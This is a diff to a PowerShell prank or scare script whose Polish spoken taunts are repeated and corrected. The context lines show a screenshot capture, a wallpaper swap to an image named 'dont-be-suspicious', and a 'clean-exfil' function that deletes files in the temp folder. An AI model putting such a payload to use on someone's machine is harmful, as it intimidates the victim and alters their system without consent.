@@ -39,7 +39,7 @@ $ImageName = "dont-be-suspicious"
 #############################################################################################################################################
 
 $s=New-Object -ComObject SAPI.SpVoice
-$s.Rate = -1
+$s.Rate = 1
 $s.Speak("Hej $FN")
 
 
@@ -78,7 +78,7 @@ echo "Czesc! Nie mam dobrych wiadomosci dla ciebie..." $fn >> $Env:temp\foo.txt
 echo "`nTwoj komputer nie jest do konca bezpieczny" >> $Env:temp\foo.txt
 
 #############################################################################################################################################
-$s.Speak("Wiem juz gdzie jestes")
+$s.Speak("Wiem już gdzie jesteś")
 
 <#
 
@@ -262,7 +262,10 @@ $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
 $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height
 
 #############################################################################################################################################
-$s.Speak("Juz nie uciekniesz")
+$s.Speak("Już nie uciekniesz")
+$s.Speak("Już nie uciekniesz")
+$s.Speak("Już nie uciekniesz")
+$s.Speak("Hahahahahahahahaha")
 
 <#
 
@@ -286,7 +289,6 @@ $bmp.Save($filename)
 # Invoke-Item $filename 
 
 #############################################################################################################################################
-$s.Speak("Juz nie uciekniesz")
 <#
 
 .NOTES 
@@ -301,7 +303,6 @@ rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 
 #############################################################################################################################################
-$s.Speak("Juz nie uciekniesz")
 <#
 
 .NOTES 
@@ -386,7 +387,6 @@ public class Params
 }
 
 #----------------------------------------------------------------------------------------------------
-$s.Speak("Juz nie uciekniesz")
 function clean-exfil {
 
 <#
@@ -420,7 +420,13 @@ try {
 	}
 }
 #----------------------------------------------------------------------------------------------------
- $s.Speak("Juz nie uciekniesz")
+
+$s.Speak("Już nie uciekniesz")
+$s.Speak("Już nie uciekniesz")
+$s.Speak("Już nie uciekniesz")
+$s.Speak("Hahahahahahahahaha")
+
+
 Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
 
 clean-exfil
